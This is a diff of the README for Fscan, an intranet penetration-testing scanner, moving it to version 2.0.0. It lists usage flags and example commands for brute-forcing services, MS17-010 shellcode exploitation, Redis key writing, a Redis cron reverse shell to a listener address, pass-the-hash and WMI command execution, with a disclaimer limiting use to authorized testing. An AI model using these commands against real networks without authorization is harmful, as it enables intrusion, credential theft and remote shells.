@@ -1,258 +1,332 @@
 # Fscan 2.0.0
 [English](README.md) | [中文](README_CN.md)
 
-# 1. Introduction
-An intranet comprehensive scanning tool, designed for automated and comprehensive vulnerability scanning of internal networks. 
-It supports host survival detection, port scanning, common service brute force, ms17010 vulnerability detection, Redis batch public key writing, scheduled task rebound shell, Windows network card information collection, web fingerprint identification, web vulnerability scanning, NetBIOS detection, domain controller identification, and many other functions.
+# 0x00 New Features
 
-# 2. Functions
-1. Information collection:
-   * Host survival detection (ICMP)
-   * Port scanning
+1. UI/UX optimization
 
-2. Brute force attacks:
-   * Various service password brute forcing (SSH, SMB, RDP, etc.)
-   * Database password brute forcing (MySQL, MSSQL, Redis, PostgreSQL, Oracle, etc.)
+2. Added -f and -o parameters, -f supports txt/csv/json, output format optimization
 
-3. System information and vulnerability scanning:
-   * NetBIOS detection and domain controller identification
-   * Network Interface Card (NIC) information collection
-   * High-risk vulnerability scanning (MS17010, etc.)
+3. Added port fingerprint recognition feature.
 
-4. Web detection:
-   * Web title detection
-   * Web fingerprinting (CMS, OA frameworks, etc.)
-   * Web vulnerability scanning (WebLogic, Struts2, etc., also supports XRay POC)
+4. Added local information collection module, local domain control detection module, and local Minidump module
 
-5. Exploitation:
-   * Redis public key writing and scheduled task creation
-   * SSH command execution
-   * MS17010 vulnerability exploitation (shellcode implantation), such as adding users
+5. Added scanning for Telnet, VNC, Elasticsearch, RabbitMQ, Kafka, ActiveMQ, LDAP, SMTP, IMAP, POP3, SNMP, Zabbix, Modbus, Rsync, Cassandra, Neo4j.
 
-6. Other features:
-   * Save output results to file
+6. Architecture refactoring, built with reflection + plugin modules
 
-# 3. Instructions
-### Getting Started
+7. Added -log parameter, supports INFO, SUCCESS, ERROR, DEBUG parameters for debugging specific information.
+
+8. Optimized threading, now runs with better multithreading
+
+**Due to the comprehensive refactoring of the old version code, there may inevitably be bugs. Please submit an issue if you encounter any bugs, and they will be fixed as soon as possible. Thank you.**
+
+**Welcome to submit new plugin modules. Currently, plugins are in a quick hot-plug form, suitable for easy development.**
+
+# 0x01 Introduction
+
+A comprehensive internal network scanning tool with rich features, providing one-click automated, all-around vulnerability scanning capabilities.
+
+## Main Features
+
+- Host live detection: Quickly identify active hosts in the internal network
+- Port scanning: Fully detect open ports on target hosts
+- Service brute force: Support password brute force testing for common services
+- Vulnerability exploitation: Integrated high-risk vulnerability detection such as MS17-010
+- Redis exploitation: Support batch writing of public keys for permission acquisition
+- System information collection: Can read Windows network card information
+- Web application detection:
+  - Web fingerprint recognition
+  - Web vulnerability scanning
+- Domain environment detection:
+  - NetBIOS information acquisition
+  - Domain controller identification
+- Post-exploitation features: Support for reverse shell through scheduled tasks
+
+# 0x02 Main Features
+## 1. Information Collection
+- ICMP-based host live detection: Quickly identify active host devices in the network
+- Comprehensive port scanning: Systematically detect open ports on target hosts
+
+## 2. Brute Force Features
+- Common service password brute force: Support authentication testing for multiple protocols such as SSH, SMB, RDP
+- Database password brute force: Cover mainstream database systems such as MySQL, MSSQL, Redis, PostgreSQL, Oracle
+
+## 3. System Information and Vulnerability Scanning
+- Network information collection: Including NetBIOS detection and domain controller identification
+- System information acquisition: Able to read network card configuration information of the target system
+- Security vulnerability detection: Support identification and detection of high-risk vulnerabilities such as MS17-010
+
+## 4. Web Application Detection
+- Website information collection: Automatically obtain website title information
+- Web fingerprint recognition: Can identify common CMS systems and OA frameworks
+- Vulnerability scanning capabilities: Integrated vulnerability detection for WebLogic, Struts2, etc., compatible with XRay POC
+
+## 5. Vulnerability Exploitation Modules
+- Redis exploitation: Support writing public keys or implanting scheduled tasks
+- SSH remote execution: Provide SSH command execution function
+- MS17-010 exploitation: Support ShellCode injection, can perform operations such as adding users
+
+## 6. Auxiliary Features
+- Scan result storage: Save all detection results to a file for subsequent analysis
+
+# 0x03 Usage Instructions
+
+## Basic Scan Configuration
+
+**Due to refactoring, not all parameters can be guaranteed to work properly. Please submit an issue if you encounter any problems.**
+
+**Target Configuration**
+
 ```
-fscan.exe -h 192.168.1.1/24
-fscan.exe -h 192.168.1.1/16
-```
-
-### Advanced Usage
-```
-fscan.exe -h 192.168.1.1/24 -np -no -nopoc    # Skip survival detection, do not save output, skip web POC scanning
-fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub    # Redis write public key
-fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666    # Redis scheduled task rebound shell
-fscan.exe -h 192.168.1.1/24 -c whoami    # Execute SSH command
-fscan.exe -h 192.168.1.1/24 -m ssh -p 2222    # Specify SSH module and port
-fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt    # Load usernames and passwords from files
-fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt    # Specify output file path (default is current directory)
-fscan.exe -h 192.168.1.1/8    # Scan the first and last IP of each C segment for quick network segment assessment
-fscan.exe -h 192.168.1.1/24 -m smb -pwd password    # SMB password brute force
-fscan.exe -h 192.168.1.1/24 -m ms17010    # Scan for MS17010 vulnerability
-fscan.exe -hf ip.txt    # Import targets from file
-fscan.exe -u http://baidu.com -proxy 8080    # Scan a URL with HTTP proxy
-fscan.exe -h 192.168.1.1/24 -nobr -nopoc    # Skip brute force and web POC scanning to reduce traffic
-fscan.exe -h 192.168.1.1/24 -pa 3389    # Add RDP scanning (port 3389)
-fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080    # Use SOCKS5 proxy (only for basic TCP functions)
-fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add    # Use MS17010 to add a user
-fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx    # SMB hash pass-the-hash
-fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx    # WMI command execution (no echo)
-fscan.exe -h 192.168.1.1/24 -m webonly    # Skip port scanning and directly scan web services
-```
-
-### Compilation Instructions
-```
-go build -ldflags="-s -w " -trimpath main.go
-upx -9 fscan.exe    # Optional, for compression
-```
-
-### Installation for Arch Linux Users
-```
-yay -S fscan-git  # or paru -S fscan-git
-```
-
-### Complete Parameter List
-```
-Usage of ./fscan:
-  -br int
-        Brute force threads (default 1)
-  -c string
-        Execute command (ssh|wmiexec)
-  -cookie string
-        Set POC cookie, e.g., -cookie rememberMe=login
-  -debug int
-        Log error frequency (default 60)
-  -dns
-        Use DNS log for POC
-  -domain string
-        SMB domain
-  -full
-        Full POC scan, e.g., all 100 Shiro keys
-  -h string
-        Target IP address range, e.g., 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
-  -hash string
-        NTLM hash for pass-the-hash
-  -hf string
-        Host file, e.g., -hf ip.txt
-  -hn string
-        Hosts to exclude, e.g., -hn 192.168.1.1/24
-  -m string
-        Select scan module, e.g., -m ssh (default "all")
-  -no
-        Do not save output log
-  -nobr
-        Do not perform brute force password attacks
-  -nopoc
-        Do not scan for web vulnerabilities
-  -np
-        Do not perform ping checks
-  -num int
-        POC scan rate (default 20)
-  -o string
-        Output file (default "result.txt")
-  -p string
-        Port selection, e.g., 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
-  -pa string
-        Add ports to default port list, e.g., -pa 3389
-  -path string
-        Remote file path for FCGI, SMB
-  -ping
-        Use ping instead of ICMP
-  -pn string
-        Ports to exclude, e.g., -pn 445
-  -pocname string
-        Filter POCs by name, e.g., -pocname weblogic
-  -pocpath string
-        POC file path
-  -portf string
-        Port file
-  -proxy string
-        Set HTTP proxy for POC, e.g., -proxy http://127.0.0.1:8080
-  -pwd string
-        Password
-  -pwda string
-        Add password to default list, e.g., -pwda password
-  -pwdf string
-        Password file
-  -rf string
-        Redis file to write SSH key, e.g., -rf id_rsa.pub
-  -rs string
-        Redis shell for cron job, e.g., -rs 192.168.1.1:6666
-  -sc string
-        MS17010 shellcode action, e.g., -sc add
-  -silent
-        Silent scan mode
-  -socks5 string
-        SOCKS5 proxy for TCP connections (timeout settings won't work with proxy)
-  -sshkey string
-        SSH private key file (id_rsa)
-  -t int
-        Number of threads (default 600)
-  -time int
-        Connection timeout in seconds (default 3)
-  -top int
-        Show top N live hosts (default 10)
-  -u string
-        URL to scan
-  -uf string
-        URL file
-  -user string
-        Username
-  -usera string
-        Add username to default list, e.g., -usera user
-  -userf string
-        Username file
-  -wmi
-        Use WMI
-  -wt int
-        Web request timeout in seconds (default 5)
+-h      Specify target (supports formats: 192.168.1.1/24, 192.168.1.1-255, 192.168.1.1,192.168.1.2)
+-eh     Exclude specific targets
+-hf     Import targets from file
 ```
 
-# 4. Demo Screenshots
+**Port Configuration**
+```
+-p      Specify port range (default common ports), e.g., -p 22,80,3306 or -p 1-65535
+-portf  Import port list from file
+```
 
-`fscan.exe -h 192.168.x.x  (Full scan with MS17010, NIC information)`
+## Authentication Configuration
+
+**Username and Password**
+```
+-user   Specify username
+-pwd    Specify password
+-userf  Username dictionary file
+-pwdf   Password dictionary file
+-usera  Add additional username
+-pwda   Add additional password
+-domain Specify domain
+```
+
+**SSH Related**
+```
+-sshkey SSH private key path
+-c      Command to execute after SSH connection
+```
+
+## Scan Control
+
+**Scan Mode**
+```
+-m      Specify scan mode (default is All)
+-t      Number of threads (default 60)
+-time   Timeout (default 3 seconds)
+-top    Display number of live detection results (default 10)
+-np     Skip live detection
+-ping   Use ping instead of ICMP
+-skip   Skip fingerprint recognition
+```
+
+## Web Scan Configuration
+
+```
+-u      Specify single URL scan
+-uf     Import URL list from file
+-cookie Set Cookie
+-wt     Web request timeout (default 5 seconds)
+```
+
+## Proxy Settings
+
+```
+-proxy  HTTP proxy (e.g., http://127.0.0.1:8080)
+-socks5 SOCKS5 proxy (e.g., 127.0.0.1:1080)
+```
+
+## POC Scan Configuration
+
+```
+-pocpath POC file path
+-pocname Specify POC name
+-full    Enable full POC scan
+-dns     Enable DNS log
+-num     POC concurrency (default 20)
+```
+
+## Redis Exploitation Configuration
+
+```
+-rf      Redis file name
+-rs      Redis Shell configuration
+-noredis Disable Redis detection
+```
+
+## Output Control
+
+```
+-o       Output file path (default off)
+-f       Output format (default txt)
+-no      Disable result saving
+-silent  Silent mode
+-nocolor Disable color output
+-json    JSON format output
+-log     Log level setting
+-pg      Display scan progress bar
+```
+
+## Other Configuration
+
+```
+-local   Local mode
+-nobr    Disable brute force
+-retry   Maximum retry times (default 3)
+-path    Remote path configuration
+-hash    Hash value
+-hashf   Hash file
+-sc      Shellcode configuration
+-wmi     Enable WMI
+-lang    Language setting (default zh)
+```
+
+**Due to refactoring, not all parameters can be guaranteed to work properly. Please submit an issue if you encounter any problems.**
+
+## Compilation Instructions
+
+```bash
+# Basic compilation
+go build -ldflags="-s -w" -trimpath main.go
+
+# UPX compression (optional)
+upx -9 fscan
+```
+
+## System Installation
+```bash
+# Arch Linux
+yay -S fscan-git
+# or
+paru -S fscan-git
+```
+
+# 0x04 Screenshots
+
+`fscan.exe -h 192.168.x.x  (full functionality, ms17010, read network card information)`
 ![](image/1.png)
 
 ![](image/4.png)
 
-`fscan.exe -h 192.168.x.x -rf id_rsa.pub (Redis write public key)`
+`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis write public key)`
 ![](image/2.png)
 
-`fscan.exe -h 192.168.x.x -c "whoami;id" (SSH command execution)`
+`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh command)`
 ![](image/3.png)
 
-`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 (XRay POC support)`
+`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 one-click support for xray's poc`
 ![](image/2020-12-12-13-34-44.png)
 
-`fscan.exe -h 192.168.x.x -p 139 (NetBIOS and domain controller detection, [+]DC indicates domain controller)`
+`fscan.exe -h 192.168.x.x -p 139 (netbios detection, domain control identification, the [+]DC in the picture represents domain control)`
 ![](image/netbios.png)
 
-`go run .\main.go -h 192.168.x.x/24 -m netbios (Show complete NetBIOS information)`
+`go run .\main.go -h 192.168.x.x/24 -m netbios (when using -m netbios, complete netbios information will be displayed)`
 ![](image/netbios1.png)
 
-`go run .\main.go -h 192.0.0.0/8 -m icmp (Network segmentation summary)`
-![](image/live.png)
+`go run .\main.go -h 192.0.0.0/8 -m icmp (detect the gateway and several random IPs of each C segment, and count the top 10 B and C segment live counts)`
+![img.png](image/live.png)
 
-# 5. Disclaimer
+New display
 
-This tool is intended **only for legally authorized** enterprise security testing activities. If you want to test this tool, please set up your own target environment.
+![2.0-1](image/2.0-1.png)
 
-To prevent malicious use, all POCs included in this project are theoretical vulnerability assessments and do not exploit vulnerabilities or launch actual attacks against targets.
+![2.0-2](image/2.0-2.png)
 
-When using this tool, ensure your actions comply with local laws and regulations and that you have obtained proper authorization. **Do not scan unauthorized targets**.
+# 0x05 Disclaimer
 
-If you engage in any illegal activities while using this tool, you bear full responsibility for the consequences. We accept no legal or joint liability.
+This tool is only for **legally authorized** enterprise security construction activities. If you need to test the availability of this tool, please set up your own target environment.
 
-Before installing and using this tool, please **carefully read and fully understand all terms of this agreement**. Important clauses regarding limitations, exemptions, and your rights may be highlighted in bold or underlined text.
+To avoid malicious use, all included POCs in this project are theoretical judgments of vulnerabilities, without the process of exploiting vulnerabilities, and will not launch real attacks and exploit vulnerabilities on the target.
 
-Unless you have fully read, understood, and accepted all terms of this agreement, do not install or use this tool. Your use of this tool or acceptance of this agreement in any express or implied manner constitutes your agreement to be bound by these terms.
+When using this tool for detection, you should ensure that the behavior complies with local laws and regulations and has obtained sufficient authorization. **Do not scan unauthorized targets.**
 
-# 6. 404StarLink 2.0 - Galaxy
+If you engage in any illegal behavior while using this tool, you will bear the corresponding consequences yourself, and we will not bear any legal and joint liability.
+
+Before installing and using this tool, please **read and fully understand the content of each clause carefully**, and pay special attention to the clauses that limit, exempt, or involve your significant rights and interests, which may be highlighted in bold or underlined.
+
+Unless you have fully read, fully understood, and accepted all the terms of this agreement, please do not install and use this tool. Your use behavior or your express or implied acceptance of this agreement will be deemed as you have read and agreed to be bound by this agreement.
+
+# 0x06 404StarLink 2.0 - Galaxy
 ![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)
 
-Fscan is a member of the 404Team [404StarLink2.0](https://github.com/knownsec/404StarLink2.0-Galaxy) project. If you have questions about fscan or want to connect with other users, you can join the community:
+fscan is part of the 404Team [StarLink Project 2.0](https://github.com/knownsec/404StarLink2.0-Galaxy). If you have any questions about fscan or want to find partners to communicate with, you can refer to the StarLink Project's group joining method.
 
 - [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)
 
-# 7. Star Chart
+Demo video [【Security Tool】5 major functions, one-click internal network scanning artifact - 404 StarLink Project fscan](https://www.bilibili.com/video/BV1Cv4y1R72M)
+
+# 0x07 Security Training
+![img.png](image/5.png)
+Learn network security, choose Linglong Security! Professional vulnerability mining, precise risk positioning; help skill improvement, shape security elites; Linglong Security, escort your digital world!  
+Free online learning of network security, covering src vulnerability mining, 0 basic security entry. Suitable for beginners, advanced, experts: https://space.bilibili.com/602205041  
+Linglong Security past students' good news🎉: https://www.ifhsec.com/list.html  
+Linglong Security vulnerability mining training contact WeChat: linglongsec
+
+# 0x08 Star Chart
 [![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)
 
-# 8. Donation
-If you find this project helpful, you can buy the author a drink 🍹 [click here](image/sponsor.png)
+# 0x09 Donation
+ If you think this project is helpful to you, you can buy the author a drink🍹 [Click me](image/sponsor.png)
 
-# 9. Reference Links
+# 0x10 Reference Links
 https://github.com/Adminisme/ServerScan  
 https://github.com/netxfly/x-crack  
 https://github.com/hack2fun/Gscan  
 https://github.com/k8gege/LadonGo   
 https://github.com/jjf012/gopoc
 
-# 10. Version History
-- **2022/11/19** - Added hash collision and wmiexec command execution without echo
-- **2022/07/14** - Added -hf parameter support for host:port format, changed rule.Search regular matching to include headers+body
-- **2022/07/06** - Added manual garbage collection, URL comma separation support, fixed POC module bugs
-- **2022/07/02** - Enhanced POC fuzzy module, added MS17010 exploitation with shellcode, added support for socks5 proxy
-- **2022/04/20** - Added -path parameter for custom POC paths, -portf for port files, improved RDP module multithreading
-- **2022/02/25** - Added -m webonly option to skip port scanning
-- **2022/01/11** - Added Oracle password brute force support
-- **2022/01/07** - Improved scanning for /8 networks, added LiveTop function to show top active segments
-- **2021/12/07** - Added RDP scanning and -pa port parameter
-- **2021/12/01** - Optimized XRay parsing, added HTTPS detection, improved IP parsing, added Docker unauthorized access detection
-- **2021/06/18** - Improved POC mechanism based on fingerprint identification
-- **2021/05/29** - Added FCGI unauthorized command execution, SSH private key authentication
-- **2021/05/15** - Added Win03 version, silent scanning mode, web fingerprinting, fixed NetBIOS module
-- **2021/05/06** - Updated module libraries, POCs, and fingerprints, improved thread processing
-- **2021/04/22** - Modified webtitle module with GBK decoding
-- **2021/04/21** - Added NetBIOS detection and domain controller identification
-- **2021/03/04** - Added support for URL scanning with -u and -uf parameters
-- **2021/02/25** - Modified YAML parsing for password brute force attacks
-- **2021/02/08** - Added fingerprint identification for common CMS and frameworks
-- **2021/02/05** - Improved ICMP packet handling for large-scale scanning
-- **2020/12/12** - Added YAML parsing engine supporting XRay POCs
-- **2020/12/06** - Optimized ICMP module, added -domain parameter for SMB
-- **2020/12/03** - Improved IP range processing, ICMP and port scanning modules
-- **2020/11/17** - Added -ping parameter as alternative to ICMP, added WebScan module and Shiro detection
-- **2020/11/16** - Optimized ICMP module with -it parameter
-- **2020/11/15** - Added support for importing IPs from file with -hf
+# 0x11 Recent Updates
+
+## 2025 Updates
+ - Added plugins
+
+## 2024 Updates
+- **2024/12/19**: v2.0.0 Major Update
+  - Complete code refactoring, improved performance and maintainability
+  - Redesigned modular architecture, supports plugin extensions
+  - Improved concurrency control, enhanced scanning efficiency
+
+## 2023 Updates
+- **2023/11/13**: 
+  - Added console color output (can be turned off with `-nocolor`)
+  - Support saving results in JSON format (`-json`)
+  - Adjusted minimum TLS version to 1.0
+  - Support port grouping (`-p db,web,service`)
+
+## 2022 Updates
+- **2022/11/19**: Added hash collision and wmiexec command execution without echo
+- **2022/7/14**: Improved file import support and search matching functionality
+- **2022/7/6**: Optimized memory management, extended URL support
+- **2022/7/2**: 
+  - Enhanced POC fuzz module
+  - Added MS17017 exploitation feature
+  - Added socks5 proxy support
+- **2022/4/20**: Added POC path specification and port file import functionality
+- **2022/2/25**: Added webonly mode (thanks @AgeloVito)
+- **2022/1/11**: Added Oracle password brute force
+- **2022/1/7**: Improved large-scale segment scanning, added LiveTop feature
+
+## 2021 Updates
+- **2021/12/7**: Added RDP scanning feature
+- **2021/12/1**: Comprehensive optimization of functional modules
+- **2021/6/18**: Improved POC recognition mechanism
+- **2021/5/29**: Added FCGI unauthorized scanning
+- **2021/5/15**: Released Windows 2003 version
+- **2021/5/6**: Updated core modules
+- **2021/4/21**: Added NetBIOS detection and domain control identification
+- **2021/3/4**: Support batch URL scanning
+- **2021/2/25**: Support password brute force feature
+- **2021/2/8**: Added fingerprint recognition feature
+- **2021/2/5**: Optimized ICMP detection
+
+## 2020 Updates
+- **2020/12/12**: Integrated YAML parsing engine, supports XRay POC
+- **2020/12/6**: Optimized ICMP module
+- **2020/12/03**: Improved IP segment handling
+- **2020/11/17**: Added WebScan module
+- **2020/11/16**: Optimized ICMP module
+- **2020/11/15**: Support file import IP
+
+_Thanks to all developers who contributed to the project_
